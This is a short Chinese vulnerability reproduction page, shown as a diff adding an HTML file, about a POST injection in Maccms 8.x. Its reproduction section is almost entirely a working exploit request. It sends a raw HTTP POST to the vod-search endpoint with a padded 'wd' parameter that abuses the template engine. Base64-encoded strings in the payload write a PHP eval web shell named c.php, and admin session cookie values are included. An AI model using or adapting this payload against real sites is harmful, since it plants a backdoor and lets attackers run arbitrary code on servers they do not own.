@@ -1,0 +1,30 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="maccms-8x-post注入"><span class="csDE05BCC">Maccms 8.x post</span><span class="csECDA2D3">注入</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">苹果</span><span class="cs8926E06">cms 8.x </span><span class="cs9C1B1871">注入</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Maccms 8.x</span></p><h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs3A447A38"><span class="cs9FB05234">POST /index.php?m=vod-search HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 500137</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://word.o2oxy.cn</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://word.o2oxy.cn/index.php?m=vod-search</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: Hm_lvt_ff7f6fcad4e6116760e7b632f9614dc2=1574418087,1574670614,1574673402,1575271439; Hm_lvt_137ae1af30761db81edff2e16f0bf0f8=1574418087,1574670615,1574673402,1575275889; pgv_pvi=8322096128; PHPSESSID=pr37r8fkshd854f8fnfep4ov53; adminid=1; adminname=admin; adminlevels=b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck=2afdbd385cb6c2af162e6733f1b0e2d2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">wd=uniona(</span><span class="cs7FFD2630">这里</span><span class="cs9FB05234">a</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">80w</span><span class="cs7FFD2630">个，可用</span><span class="cs9FB05234">Burp</span><span class="cs7FFD2630">直接生成</span><span class="cs9FB05234">){if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A</span></p></body>
+</html>
